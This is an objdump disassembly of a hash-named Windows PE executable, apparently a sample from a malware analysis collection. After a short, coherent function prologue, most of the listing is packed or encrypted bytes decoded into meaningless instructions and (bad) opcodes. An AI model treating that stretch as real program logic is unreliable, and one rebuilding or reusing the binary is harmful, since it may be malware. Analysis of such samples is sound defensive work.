
a0cc535de6b7aef61c0ec0846b44bb053a6722be0c7bf14cfaa087b52a910a69.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	push   ebx
  401007:	mov    DWORD PTR [ebp-0x48],0x0
  40100e:	mov    DWORD PTR [ebp-0x18],0x0
  401015:	mov    DWORD PTR [ebp-0x70],0x0
  40101c:	mov    DWORD PTR [ebp-0x60],0x0
  401023:	mov    DWORD PTR [ebp-0x8],0x0
  40102a:	mov    DWORD PTR [ebp-0x6c],0x0
  401031:	mov    DWORD PTR [ebp-0x68],0x0
  401038:	mov    DWORD PTR [ebp-0x14],0x0
  40103f:	mov    DWORD PTR [ebp-0x4c],0x0
  401046:	mov    DWORD PTR [ebp-0x10],0x0
  40104d:	mov    DWORD PTR [ebp-0x58],0x0
  401054:	mov    DWORD PTR [ebp-0x4],0x0
  40105b:	mov    DWORD PTR [ebp-0x5c],0x0
  401062:	mov    DWORD PTR [ebp-0x30],0x0
  401069:	mov    DWORD PTR [ebp-0x54],0x0
  401070:	mov    DWORD PTR [ebp-0x2c],0x0
  401077:	mov    DWORD PTR [ebp-0x50],0x0
  40107e:	mov    DWORD PTR [ebp-0xc],0x0
  401085:	mov    eax,ds:0x449e08
  40108a:	mov    DWORD PTR [ebp-0x28],eax
  40108d:	mov    ecx,DWORD PTR ds:0x449e0c
  401093:	mov    DWORD PTR [ebp-0x24],ecx
  401096:	mov    edx,DWORD PTR ds:0x449e10
  40109c:	mov    DWORD PTR [ebp-0x20],edx
  40109f:	mov    al,ds:0x449e14
  4010a4:	mov    BYTE PTR [ebp-0x1c],al
  4010a7:	mov    ecx,DWORD PTR ds:0x449e18
  4010ad:	mov    DWORD PTR [ebp-0x40],ecx
  4010b0:	mov    edx,DWORD PTR ds:0x449e1c
  4010b6:	mov    DWORD PTR [ebp-0x3c],edx
  4010b9:	mov    eax,ds:0x449e20
  4010be:	mov    DWORD PTR [ebp-0x38],eax
  4010c1:	mov    cx,WORD PTR ds:0x449e24
  4010c8:	mov    WORD PTR [ebp-0x34],cx
  4010cc:	mov    dl,BYTE PTR ds:0x449e26
  4010d2:	mov    BYTE PTR [ebp-0x32],dl
  4010d5:	mov    DWORD PTR [ebp-0x30],0x40
  4010dc:	lea    eax,[ebp-0x40]
  4010df:	push   eax
  4010e0:	lea    ecx,[ebp-0x10]
  4010e3:	push   ecx
  4010e4:	call   DWORD PTR ds:0x418000
  4010ea:	test   eax,eax
  4010ec:	je     0x4167b5
  4010f2:	mov    edx,DWORD PTR [ebp-0x10]
  4010f5:	add    edx,0x1
  4010f8:	mov    DWORD PTR [ebp-0x10],edx
  4010fb:	dec    edx
  4010fc:	xor    edi,DWORD PTR [esi-0x4d65c473]
  401102:	adc    cl,BYTE PTR [eax]
  401104:	retf   0x860c
  401107:	lods   eax,DWORD PTR ds:[esi]
  401108:	fist   WORD PTR [edi-0x398a5bad]
  40110e:	ret    0x984c
  401111:	or     bl,bh
  401113:	mov    dl,0xaf
  401115:	cld    
  401116:	(bad)  
  401117:	out    dx,eax
  401118:	mov    edx,0xed5bc1dc
  40111d:	add    BYTE PTR [edi+0x7a],bh
  401120:	retf   
  401121:	scas   eax,DWORD PTR es:[edi]
  401122:	push   ecx
  401123:	adc    eax,0x5e09f39f
  401128:	jmp    0xe7c5374d
  40112d:	and    DWORD PTR [esi-0x22eddd36],eax
  401133:	rcr    BYTE PTR [edx+0x24],cl
  401136:	pop    edi
  401137:	cdq    
  401138:	pop    ds
  401139:	add    eax,0x7c57e187
  40113e:	xchg   BYTE PTR [edx+0x46770649],cl
  401144:	inc    ebp
  401145:	or     ah,BYTE PTR [ebx+0x1d12caea]
  40114b:	data16 fwait
  40114d:	add    al,0xc2
  40114f:	pusha  
  401150:	outs   dx,BYTE PTR ds:[esi]
  401151:	inc    edx
  401152:	cmp    eax,0x199f8c9e
  401157:	loope  0x401125
  401159:	sub    bl,ch
  40115b:	jg     0x401140
  40115d:	repnz dec edi
  40115f:	aad    0x8f
  401161:	pop    edx
  401162:	lods   al,BYTE PTR ds:[esi]
  401163:	or     ch,ch
  401165:	jo     0x401105
  401167:	jg     0x401177
  401169:	pusha  
  40116a:	and    eax,0x93f8fedc
  40116f:	repz jmp 0xd371:0x823c335f
  401177:	push   ebp
  401178:	sbb    DWORD PTR [edi],edx
  40117a:	xchg   edx,eax
  40117b:	addr16 sub al,0xae
  40117e:	xchg   ebx,eax
  40117f:	push   esi
  401180:	loop   0x401165
  401182:	mov    esi,0xed8cfc1d
  401187:	adc    bl,0x1c
  40118a:	dec    edx
  40118b:	jne    0x4011f1
  40118d:	repnz sti 
  40118f:	dec    eax
  401190:	push   esi
  401191:	icebp  
  401192:	adc    ch,dh
  401194:	leave  
  401195:	cmp    DWORD PTR [edx+0x61ddc7cd],0xffffffbd
  40119c:	ret    0x6fcd
  40119f:	aam    0xb1
  4011a1:	imul   esi,DWORD PTR [ecx+eiz*2-0x66190a74],0xffffffc1
  4011a9:	test   eax,0x8c69a204
  4011ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4011af:	xor    al,0x6e
  4011b1:	stos   BYTE PTR es:[edi],al
  4011b2:	sti    
  4011b3:	and    BYTE PTR [ecx+0x5e],bh
  4011b6:	xchg   esp,eax
  4011b7:	or     esp,eax
  4011b9:	enter  0x23e8,0x71
  4011bd:	cwde   
  4011be:	int3   
  4011bf:	hlt    
  4011c0:	mov    edi,0xd0b87946
  4011c5:	js     0x401173
  4011c7:	jno    0x401167
  4011c9:	out    dx,eax
  4011ca:	mov    eax,0xed9ac95
  4011cf:	mov    ds:0x9a1d5cb2,eax
  4011d4:	mov    cs,WORD PTR [eax+0x5c]
  4011d7:	mov    DWORD PTR [esi-0x10],ebp
  4011da:	and    BYTE PTR [ecx],bh
  4011dc:	jns    0x40119d
  4011de:	cmp    al,0x94
  4011e0:	mov    dh,0x5e
  4011e2:	dec    esi
  4011e3:	jecxz  0x4011d6
  4011e5:	ds repnz es ss pop esp
  4011ea:	cwde   
  4011eb:	mov    ds:0x74bd347d,al
  4011f0:	or     al,0xb6
  4011f2:	test   BYTE PTR [edx+0x9c6fe16],bl
  4011f8:	ret    
  4011f9:	outs   dx,BYTE PTR ds:[esi]
  4011fa:	jnp    0x401252
  4011fc:	adc    ah,ch
  4011fe:	jo     0x401221
  401200:	test   eax,0x16cd786c
  401205:	xchg   edx,eax
  401206:	add    esi,edx
  401208:	leave  
  401209:	dec    edi
  40120a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40120b:	lahf   
  40120c:	loope  0x401249
  40120e:	ret    0x1893
  401211:	and    DWORD PTR [edx-0x70ad513d],ebp
  401217:	shl    DWORD PTR ds:[ecx+0x2e],cl
  40121b:	jmp    0x11db4396
  401220:	xor    al,0x10
  401222:	aaa    
  401223:	rol    BYTE PTR [eax],cl
  401225:	mov    ch,0x9d
  401227:	or     ebp,DWORD PTR [ebx]
  401229:	popa   
  40122a:	or     BYTE PTR [ecx-0x42],ch
  40122d:	add    al,0xa0
  40122f:	xchg   edi,eax
  401230:	mov    eax,ds:0xb8c309a7
  401235:	dec    ebp
  401236:	or     ah,dh
  401238:	push   edi
  401239:	leave  
  40123a:	dec    edi
  40123b:	aad    0x72
  40123d:	(bad)
  401240:	mov    ds,esp
  401242:	sbb    al,0xb5
  401244:	dec    edx
  401245:	lea    esi,[esp+edx*2+0x5b]
  401249:	dec    ebp
  40124a:	jns    0x40120d
  40124c:	(bad)
  40124f:	in     al,0x4b
  401251:	dec    ecx
  401252:	push   ebx
  401253:	pop    esi
  401254:	or     dl,dl
  401256:	lahf   
  401257:	sbb    DWORD PTR [edx-0x51db622],ebp
  40125d:	cmp    al,0x52
  40125f:	mov    dl,0xd8
  401261:	jo     0x4012a5
  401263:	scas   al,BYTE PTR es:[edi]
  401264:	cli    
  401265:	mov    esp,0x9b5ca22d
  40126a:	inc    ebp
  40126b:	dec    eax
  40126c:	mov    esp,0x642efebe
  401271:	xchg   edx,eax
  401272:	mov    ch,0xda
  401274:	adc    esi,DWORD PTR [ebx]
  401276:	lock pop ecx
  401278:	xlat   BYTE PTR ds:[ebx]
  401279:	pop    es
  40127a:	daa    
  40127b:	fmul   DWORD PTR [esi-0x2a6d65ae]
  401281:	fadd   QWORD PTR [esi-0x3b]
  401284:	cmp    ebx,DWORD PTR [eax]
  401286:	pop    ds
  401287:	mov    ch,al
  401289:	int    0x9a
  40128b:	rcl    BYTE PTR [ebp-0x75],1
  40128e:	in     eax,dx
  40128f:	iret   
  401290:	cmp    BYTE PTR [edi-0x1d05ef3e],al
  401296:	dec    ebx
  401297:	cmp    eax,0xb340d761
  40129c:	retf   0x9582
  40129f:	scas   al,BYTE PTR es:[edi]
  4012a0:	nop
  4012a1:	jo     0x401291
  4012a3:	std    
  4012a4:	sub    eax,0x9d90d315
  4012a9:	sub    edi,DWORD PTR [ebp+edi*1-0x1c]
  4012ad:	mov    eax,ds:0xec2b8326
  4012b2:	and    ah,dl
  4012b4:	mov    ss,WORD PTR [edi+0x2bfa5f2a]
  4012ba:	adc    ebx,DWORD PTR [ebx+0x69af9ded]
  4012c0:	popa   
  4012c1:	push   ebx
  4012c2:	idiv   DWORD PTR [ebx+0x47]
  4012c5:	adc    ecx,DWORD PTR [eax+0xa]
  4012c8:	mov    eax,ds:0x5cee1f8e
  4012cd:	fdivr  QWORD PTR [ebx+edi*4]
  4012d0:	sbb    eax,0xb3cec159
  4012d5:	imul   al
  4012d7:	out    dx,al
  4012d8:	call   FWORD PTR [eax+0x52]
  4012db:	les    ecx,FWORD PTR [ebx+edx*8-0x743e122a]
  4012e2:	and    ebx,DWORD PTR [esi]
  4012e4:	xlat   BYTE PTR ds:[ebx]
  4012e5:	in     eax,0x75
  4012e7:	cs aam 0xb0
  4012ea:	pop    ebp
  4012eb:	push   edx
  4012ec:	test   DWORD PTR [ebp+0x3bdb514],ecx
  4012f2:	xor    DWORD PTR [eax-0x46],esp
  4012f5:	mov    dh,BYTE PTR [esi-0x25]
  4012f8:	popa   
  4012f9:	or     DWORD PTR [esi+0x6],0x21
  4012fd:	jbe    0x401305
  4012ff:	mov    ebx,0x56df22b7
  401304:	cmc    
  401305:	daa    
  401306:	cmp    BYTE PTR [esi],ah
  401308:	mov    al,0x9c
  40130a:	cld    
  40130b:	add    esi,DWORD PTR [edi]
  40130d:	into   
  40130e:	shl    eax,cl
  401310:	test   al,0x87
  401312:	dec    esi
  401313:	aad    0x9f
  401315:	std    
  401316:	xchg   ebx,eax
  401317:	mov    ebp,0xd1014e93
  40131c:	jecxz  0x401390
  40131e:	mov    dl,0x6f
  401320:	fwait
  401321:	adc    al,0xbf
  401323:	fwait
  401324:	xor    BYTE PTR [edx-0x24],dl
  401327:	cmp    edx,DWORD PTR [edx+0x16]
  40132a:	mov    bl,0x13
  40132c:	sbb    ecx,DWORD PTR [esi+0x7398fac]
  401332:	fistp  DWORD PTR [ecx+0xac53e28]
  401338:	mov    edi,0x1a937c1f
  40133d:	xchg   BYTE PTR [ebx-0x5],dl
  401340:	push   es
  401341:	idiv   BYTE PTR [esi+0x58]
  401344:	pusha  
  401345:	jo     0x4013a8
  401347:	loop   0x401302
  401349:	cwde   
  40134a:	mov    ecx,0x9bcd2c9f
  40134f:	fisub  DWORD PTR [ebp+eax*4-0x2bc18d61]
  401356:	jb     0x4013c9
  401358:	mov    ds:0x12b61512,eax
  40135d:	inc    esi
  40135e:	in     eax,0xfa
  401360:	(bad)  
  401361:	outs   dx,DWORD PTR ds:[esi]
  401362:	(bad)  
  401363:	js     0x4013b6
  401365:	iret   
  401366:	adc    ah,dl
  401368:	inc    edx
  401369:	in     eax,dx
  40136a:	retf   0x413e
  40136d:	dec    eax
  40136e:	or     DWORD PTR [ebp+0x3ca6f07f],ebp
  401374:	int    0x5d
  401376:	mov    ebx,0x4601b982
  40137b:	sbb    eax,0x1c1fd567
  401380:	mov    eax,0x9b9bbec9
  401385:	mov    BYTE PTR [esi-0x54],bl
  401388:	fcmovne st,st(4)
  40138a:	cmp    bl,ch
  40138c:	jg     0x4013e9
  40138e:	das    
  40138f:	in     al,dx
  401390:	cmc    
  401391:	mov    dh,0x7d
  401393:	es mov ebx,0x1eebad6f
  401399:	ret    
  40139a:	adc    esi,ebp
  40139c:	jge    0x401376
  40139e:	dec    edi
  40139f:	pop    edx
  4013a0:	pop    ds
  4013a1:	inc    esp
  4013a2:	xchg   DWORD PTR [ecx],edi
  4013a4:	xchg   esp,edx
  4013a6:	jmp    0xf9a3:0xabfc43c4
  4013ad:	stos   BYTE PTR es:[edi],al
  4013ae:	gs out dx,eax
  4013b0:	mov    esp,0x7b92ec9c
  4013b5:	cmp    ecx,edx
  4013b7:	cwde   
  4013b8:	fstp   QWORD PTR ds:[edi-0x50]
  4013bc:	cli    
  4013bd:	pop    esp
  4013be:	in     eax,dx
  4013bf:	out    dx,al
  4013c0:	or     esi,DWORD PTR [ebp-0x3177f925]
  4013c6:	jmp    0x91ea6dd1
  4013cb:	les    esi,FWORD PTR [ecx-0x7ab01ac4]
  4013d1:	or     eax,0x6a499dce
  4013d6:	sti    
  4013d7:	push   ecx
  4013d8:	retf   0xb84f
  4013db:	xchg   BYTE PTR [eax],dh
  4013dd:	jnp    0x401391
  4013df:	pop    eax
  4013e0:	inc    eax
  4013e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013e2:	fidiv  DWORD PTR [eax+0x31]
  4013e5:	inc    edx
  4013e6:	dec    ecx
  4013e7:	test   eax,0x1d94e7f3
  4013ec:	iret   
  4013ed:	fcmovu st,st(1)
  4013ef:	jo     0x401440
  4013f1:	dec    eax
  4013f2:	cmp    eax,0xdb382af0
  4013f7:	lds    edx,FWORD PTR [ebx-0x49e05fa6]
  4013fd:	mov    al,0x11
  4013ff:	out    0x92,eax
  401401:	mul    esp
  401403:	fsub   QWORD PTR [esi-0x14f466a0]
  401409:	cld    
  40140a:	into   
  40140b:	inc    esi
  40140c:	out    0xa1,al
  40140e:	adc    al,0x5d
  401410:	imul   eax,DWORD PTR [ebx+0x7c82859a],0x21ebf550
  40141a:	out    dx,al
  40141b:	sbb    al,0x10
  40141d:	mov    ds:0x13a673,al
  401422:	sahf   
  401423:	outs   dx,DWORD PTR ds:[esi]
  401424:	(bad)  
  401425:	lock test BYTE PTR [ecx],al
  401428:	shr    DWORD PTR [edi+0x40],cl
  40142b:	sbb    BYTE PTR [edi+edi*8+0x60],cl
  40142f:	pop    ds
  401430:	dec    ecx
  401431:	push   ds
  401432:	dec    esi
  401433:	popa   
  401434:	pop    esp
  401435:	outs   dx,DWORD PTR ds:[esi]
  401436:	mov    esi,0xeada0816
  40143b:	xor    al,0x22
  40143d:	loope  0x401488
  40143f:	jecxz  0x4014aa
  401441:	push   ecx
  401442:	fwait
  401443:	stos   DWORD PTR es:[edi],eax
  401444:	fdivr  DWORD PTR [edi]
  401446:	mov    ecx,0x5dd4c107
  40144b:	add    ecx,DWORD PTR [edx-0x50]
  40144e:	fist   DWORD PTR [edi-0x21d7d437]
  401454:	xor    ah,BYTE PTR ds:0x99ba951f
  40145a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40145b:	cmp    al,0xd5
  40145d:	sub    DWORD PTR [ebx+0x2159f746],ebx
  401463:	jo     0x401496
  401465:	test   DWORD PTR [bp-0x3275],esp
  40146a:	mov    edx,0x61d9868a
  40146f:	mov    dh,bh
  401471:	push   ss
  401472:	fnsave [ebp-0x4]
  401475:	pop    es
  401476:	cmp    al,0x6b
  401478:	mov    ds:0x14474bc2,eax
  40147d:	enter  0x60ac,0x78
  401481:	cld    
  401482:	hlt    
  401483:	out    0x7f,al
  401485:	outs   dx,BYTE PTR ds:[esi]
  401486:	cmc    
  401487:	cdq    
  401488:	hlt    
  401489:	adc    al,BYTE PTR [esi+ebp*8-0x2e23da69]
  401490:	mov    BYTE PTR [ecx+ecx*2+0x7],al
  401494:	dec    edi
  401495:	shl    BYTE PTR [edi+0x34],cl
  401498:	inc    ecx
  401499:	sub    al,0x20
  40149b:	xor    eax,0xec5f41db
  4014a0:	cld    
  4014a1:	adc    ah,BYTE PTR [esi+0x147933f1]
  4014a7:	pop    edi
  4014a8:	aam    0xac
  4014aa:	data16 mov ?,WORD PTR [edi-0x7715621f]
  4014b1:	stos   BYTE PTR es:[edi],al
  4014b2:	(bad)  
  4014b3:	aas    
  4014b4:	fs or  al,0xd9
  4014b7:	test   al,al
  4014b9:	adc    eax,0x73895802
  4014be:	cld    
  4014bf:	fcomi  st,st(2)
  4014c1:	lods   al,BYTE PTR ds:[esi]
  4014c2:	imul   esp,DWORD PTR [eax],0x37461b60
  4014c8:	js     0x40145b
  4014ca:	mov    esp,0x8192ab82
  4014cf:	pushw  0x7e
  4014d2:	mov    dh,0x83
  4014d4:	mov    edi,0x3071bb60
  4014d9:	dec    esi
  4014da:	jo     0x4014b1
  4014dc:	fs pop edx
  4014de:	lods   al,BYTE PTR ds:[esi]
  4014df:	je     0x40148d
  4014e1:	pop    ebp
  4014e2:	in     al,dx
  4014e3:	sbb    ebx,edx
  4014e5:	xchg   esp,eax
  4014e6:	mov    bh,0xed
  4014e8:	and    eax,0xedc94c02
  4014ed:	push   es
  4014ee:	sbb    esi,eax
  4014f0:	xor    ebp,DWORD PTR [eax+0x59]
  4014f3:	mov    ebp,0x59160441
  4014f8:	lds    esp,FWORD PTR [esi]
  4014fa:	or     BYTE PTR [esi+esi*2+0x2f5b4adc],ah
  401501:	cmp    bh,BYTE PTR [ecx-0x25]
  401504:	hlt    
  401505:	test   eax,0x92120e84
  40150a:	add    BYTE PTR [ebx-0x3e],al
  40150d:	int    0xb4
  40150f:	aam    0x5d
  401511:	and    DWORD PTR [ebx],ecx
  401513:	repz add cl,BYTE PTR [edx+ebp*4-0x29]
  401518:	int3   
  401519:	(bad)  
  40151b:	popa   
  40151c:	cs push 0xffffffc4
  40151f:	add    BYTE PTR [ebp-0x25],al
  401522:	out    0x9e,al
  401524:	out    0xcf,eax
  401526:	adc    al,0xe2
  401528:	cmp    esi,esp
  40152a:	out    0x95,eax
  40152c:	push   0xffffffaa
  40152e:	pop    ds
  40152f:	fnstsw WORD PTR [ecx-0xa92f219]
  401535:	xchg   ebp,eax
  401536:	dec    edi
  401537:	fisub  WORD PTR [eax+0x79a82270]
  40153d:	ss xor ebx,0xffffffe8
  401541:	jle    0x4015c1
  401543:	rcr    BYTE PTR [esp+esi*4+0x77f764ff],1
  40154a:	sti    
  40154b:	cmp    bl,cl
  40154d:	mov    ch,0x8
  40154f:	mov    bh,0x2e
  401551:	jecxz  0x401539
  401553:	xchg   BYTE PTR [ecx-0xc],ah
  401556:	cwde   
  401557:	add    BYTE PTR [ebp-0x4d8cbc45],ah
  40155d:	xchg   esi,eax
  40155e:	and    esi,ebp
  401560:	xor    BYTE PTR [ecx],0xd2
  401563:	or     DWORD PTR [ebp+0x4],esi
  401566:	ins    DWORD PTR es:[edi],dx
  401567:	mov    edi,0x18d88588
  40156c:	lds    esi,FWORD PTR [edi-0x7a]
  40156f:	pop    es
  401570:	scas   al,BYTE PTR es:[edi]
  401571:	inc    esp
  401572:	or     BYTE PTR [ebx-0x42],0xfe
  401576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401577:	loop   0x40152a
  401579:	fisub  WORD PTR [esi-0x12ca7535]
  40157f:	xchg   ecx,eax
  401580:	mov    edi,0x1befd666
  401585:	jns    0x4015bc
  401587:	dec    edi
  401588:	pop    ds
  401589:	out    0x92,eax
  40158b:	xlat   BYTE PTR ds:[ebx]
  40158c:	outs   dx,BYTE PTR ds:[esi]
  40158d:	cmp    DWORD PTR [ebp+0xb],esi
  401590:	sti    
  401591:	push   esp
  401592:	push   esi
  401593:	stos   BYTE PTR es:[edi],al
  401594:	addr16 mov al,ds:0xb2ed
  401598:	cmc    
  401599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40159a:	and    esi,DWORD PTR [ecx-0x78b225f7]
  4015a0:	jno    0x4015bd
  4015a2:	mov    edx,0x577eb8ca
  4015a7:	sub    DWORD PTR [edi+ebp*2+0x16abbe05],esp
  4015ae:	push   ebx
  4015af:	ins    BYTE PTR es:[edi],dx
  4015b0:	pop    ds
  4015b1:	inc    ebp
  4015b2:	lods   al,BYTE PTR ds:[esi]
  4015b3:	push   ebp
  4015b4:	mov    ebx,0x45ebb955
  4015b9:	clc    
  4015ba:	jbe    0x40162f
  4015bc:	ins    DWORD PTR es:[edi],dx
  4015bd:	and    bh,BYTE PTR [ebx+0x78]
  4015c0:	push   eax
  4015c1:	xchg   ecx,eax
  4015c2:	cli    
  4015c3:	mov    esi,0x7374e2da
  4015c8:	fs (bad) 
  4015ca:	in     eax,0x69
  4015cc:	sahf   
  4015cd:	inc    eax
  4015ce:	in     al,dx
  4015cf:	inc    edi
  4015d0:	aaa    
  4015d1:	icebp  
  4015d2:	sub    dl,BYTE PTR [eax]
  4015d4:	ja     0x401571
  4015d6:	push   cs
  4015d7:	(bad)  
  4015d9:	and    eax,0x9ff0d55
  4015de:	lods   al,BYTE PTR ds:[esi]
  4015df:	loopne 0x401569
  4015e1:	mov    dh,0xd
  4015e3:	mov    ds:0x1235af8b,al
  4015e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015e9:	xor    esi,DWORD PTR [ebp+0x39]
  4015ec:	popf   
  4015ed:	adc    BYTE PTR [ebx-0x471a85bc],0xa5
  4015f4:	pop    ds
  4015f5:	imul   ecx,DWORD PTR [ebp-0x39e368ce],0x78dc29f
  4015ff:	pop    edi
  401600:	test   eax,0x15fde292
  401605:	ret    
  401606:	ss out dx,al
  401608:	xlat   BYTE PTR ds:[ebx]
  401609:	xlat   BYTE PTR ds:[ebx]
  40160a:	xchg   esp,eax
  40160b:	imul   edx,DWORD PTR [ecx+0x79],0xa1b05e2
  401612:	mov    dh,bh
  401614:	and    BYTE PTR [eax-0x34a41243],dh
  40161a:	(bad)  
  40161b:	imul   edi,DWORD PTR [ebx+0x11],0x414cac6b
  401622:	out    0xb3,eax
  401624:	add    al,0x21
  401626:	xchg   ebx,eax
  401627:	and    bx,si
  40162a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40162b:	arpl   WORD PTR [eax+ecx*4-0x3a708e10],dx
  401632:	mov    ds:0xea1b5ff6,eax
  401637:	xchg   ecx,eax
  401638:	sub    ah,0xf9
  40163b:	add    BYTE PTR [eax+0xa9500e5],dh
  401641:	push   es
  401642:	lods   eax,DWORD PTR ds:[esi]
  401643:	jnp    0x401660
  401645:	sbb    eax,0x3781d97a
  40164a:	in     eax,dx
  40164b:	into   
  40164c:	les    ebp,FWORD PTR [ebp+edx*2+0x4]
  401650:	sbb    DWORD PTR [ebx+ebx*4-0x39ddcda3],0x2e
  401658:	int    0xf4
  40165a:	push   esi
  40165b:	dec    ebx
  40165c:	lahf   
  40165d:	loope  0x401614
  40165f:	inc    edx
  401660:	dec    esp
  401661:	iret   
  401662:	pop    es
  401663:	call   0xd60e:0x8ed028dc
  40166a:	pushf  
  40166b:	mov    gs,WORD PTR [edi-0x2d26ac2a]
  401671:	cmp    eax,0x9584116b
  401676:	xchg   esp,eax
  401677:	adc    BYTE PTR [edi],ch
  401679:	test   BYTE PTR [esi],ah
  40167b:	js     0x4016f9
  40167d:	repz pop ds
  40167f:	out    dx,al
  401680:	inc    esi
  401681:	(bad)  
  401682:	int    0xa
  401684:	(bad)  
  401685:	stc    
  401686:	cs sub al,0x8b
  401689:	or     esi,DWORD PTR [ebx]
  40168b:	add    ebx,0xffffffb0
  40168e:	xlat   BYTE PTR ds:[ebx]
  40168f:	xor    eax,0x3c2319d1
  401694:	adc    al,0xe2
  401696:	retf   0x63b4
  401699:	pop    es
  40169a:	mov    edx,0x94b42903
  40169f:	inc    esp
  4016a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016a1:	inc    ebp
  4016a2:	loope  0x4016c0
  4016a4:	xor    BYTE PTR [esi-0x75],ah
  4016a7:	push   edx
  4016a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016a9:	out    dx,al
  4016aa:	mov    al,ds:0x2c3f70c3
  4016af:	test   eax,0x4dc667d0
  4016b4:	adc    bh,BYTE PTR [edi+0x540711e1]
  4016ba:	and    ebx,DWORD PTR gs:0xcfd88ba5
  4016c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4016c2:	xchg   ebp,eax
  4016c3:	ins    DWORD PTR es:[edi],dx
  4016c4:	push   0x8
  4016c6:	ret    0xd335
  4016c9:	cmp    ebx,eax
  4016cb:	mov    edx,edi
  4016cd:	dec    ecx
  4016ce:	fs xchg ebx,eax
  4016d0:	jno    0x40166c
  4016d2:	jp     0x40165d
  4016d4:	sbb    eax,0x3f976e44
  4016d9:	and    al,bh
  4016db:	cmp    eax,0x69c2ec08
  4016e0:	or     eax,edx
  4016e2:	imul   esi,DWORD PTR [ebx+esi*1+0x321672eb],0xffffffa3
  4016ea:	adc    DWORD PTR [eax+0x7b],eax
  4016ed:	lahf   
  4016ee:	hlt    
  4016ef:	xchg   esp,eax
  4016f0:	sbb    al,0xe8
  4016f2:	lea    esp,[ebx]
  4016f4:	push   ebx
  4016f5:	icebp  
  4016f6:	inc    ecx
  4016f7:	sbb    al,0x3f
  4016f9:	inc    ebp
  4016fa:	test   BYTE PTR [eax*2-0x14b3316d],0xfe
  401702:	outs   dx,BYTE PTR ds:[esi]
  401703:	fld    TBYTE PTR ds:0x40f1abf7
  401709:	push   ss
  40170a:	pop    ds
  40170b:	inc    esi
  40170c:	jl     0x401714
  40170e:	mov    dh,0x46
  401710:	cmp    al,0xee
  401712:	add    DWORD PTR [edx+ecx*8],eax
  401715:	xor    BYTE PTR [eax-0x1c89bd18],0xff
  40171c:	add    ch,bh
  40171e:	fwait
  40171f:	xchg   ebp,eax
  401720:	dec    ebx
  401721:	fisttp QWORD PTR [edi-0x1e]
  401724:	int3   
  401725:	scas   eax,DWORD PTR es:[edi]
  401726:	aas    
  401727:	cli    
  401728:	in     al,dx
  401729:	cdq    
  40172a:	es and eax,0x7f844826
  401730:	xor    WORD PTR [esi+0x23],di
  401734:	icebp  
  401735:	test   al,0x73
  401737:	and    al,0xb9
  401739:	scas   eax,DWORD PTR es:[edi]
  40173a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40173b:	mov    ch,0x55
  40173d:	call   0x469f9fcb
  401742:	and    eax,0xe6d8853
  401747:	sbb    al,0x4c
  401749:	mov    edi,0x2917ea97
  40174e:	xchg   esp,eax
  40174f:	adc    ah,BYTE PTR [edi-0x1ef25aa9]
  401755:	retf   
  401756:	fldenv [eax]
  401758:	mov    ah,BYTE PTR [ebp+0x6]
  40175b:	into   
  40175c:	pop    DWORD PTR [ebx+0x38305760]
  401762:	leave  
  401763:	loop   0x401780
  401765:	cmp    ebx,edx
  401767:	ror    BYTE PTR [esp+eax*1-0x70f1e29d],1
  40176e:	mov    eax,0xe74f5ac4
  401773:	xchg   esp,eax
  401774:	and    al,ch
  401776:	mov    cl,0x5d
  401778:	jb     0x4017f9
  40177a:	gs sub al,0x3
  40177d:	jg     0x4016ff
  40177f:	mov    al,ds:0x9d01ac90
  401784:	xor    al,0x54
  401786:	je     0x40173f
  401788:	inc    ebx
  401789:	sub    esp,DWORD PTR [edi]
  40178b:	lods   al,BYTE PTR ds:[esi]
  40178c:	xor    esi,edi
  40178e:	call   0x45ac:0x5057af06
  401795:	f2xm1  
  401797:	mov    esi,ss
  401799:	xchg   BYTE PTR [esi-0x7bfbb96f],dl
  40179f:	ins    DWORD PTR es:[edi],dx
  4017a0:	stos   DWORD PTR es:[edi],eax
  4017a1:	push   ebx
  4017a2:	push   cs
  4017a3:	hlt    
  4017a4:	jae    0x4017ac
  4017a6:	mov    dl,0xea
  4017a8:	icebp  
  4017a9:	jbe    0x4017b6
  4017ab:	mov    BYTE PTR [ebp+0x169a62cd],bl
  4017b1:	js     0x401821
  4017b3:	and    DWORD PTR [ebx+0x61],0x5e
  4017b7:	xchg   esp,eax
  4017b8:	aas    
  4017b9:	push   ebp
  4017ba:	adc    eax,0x5f19723d
  4017bf:	dec    ebp
  4017c0:	icebp  
  4017c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4017c2:	loopne 0x4017d4
  4017c4:	pop    ebp
  4017c5:	sahf   
  4017c6:	and    esp,0x74
  4017c9:	and    si,WORD PTR [di-0x782e]
  4017cf:	loopne 0x401807
  4017d1:	(bad)  
  4017d3:	sbb    BYTE PTR [esi],ch
  4017d5:	scas   al,BYTE PTR es:[edi]
  4017d6:	or     BYTE PTR [edx-0x5f],0xb2
  4017da:	sub    eax,0xa4d30741
  4017df:	pop    ds
  4017e0:	lods   al,BYTE PTR ds:[esi]
  4017e1:	bound  ecx,QWORD PTR [ecx+0x37]
  4017e4:	mov    eax,ebp
  4017e6:	add    eax,0x3fa9ba4b
  4017eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4017ec:	test   al,0xa1
  4017ee:	xor    ecx,ecx
  4017f0:	inc    BYTE PTR [ebx]
  4017f2:	push   esi
  4017f3:	jne    0x401780
  4017f5:	pop    edi
  4017f6:	fcomp  DWORD PTR [ecx-0x410a33cd]
  4017fc:	mov    DWORD PTR [edx-0x625806ad],eax
  401802:	cwde   
  401803:	pop    edx
  401804:	jp     0x401852
  401806:	fisub  DWORD PTR [ebp+0x1f]
  401809:	arpl   WORD PTR [edx+ebp*2],di
  40180c:	out    0xd9,eax
  40180e:	je     0x401846
  401810:	ja     0x401863
